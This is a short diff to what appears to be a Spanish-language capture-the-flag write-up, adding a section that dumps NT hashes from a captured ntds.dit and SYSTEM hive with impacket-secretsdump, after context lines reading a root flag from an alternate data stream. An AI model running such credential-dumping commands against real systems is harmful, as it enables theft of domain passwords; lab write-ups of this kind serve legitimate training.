@@ -124,3 +124,8 @@ sc start userlogger C:\Users\Administrator\Desktop\root.txt:
 more < C:\Users\Administrator\Desktop\root.txt:flag.txt
 ```
 
+## Dumpeo de hashes NT
+
+```null
+impacket-secretsdump -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit LOCAL
+```
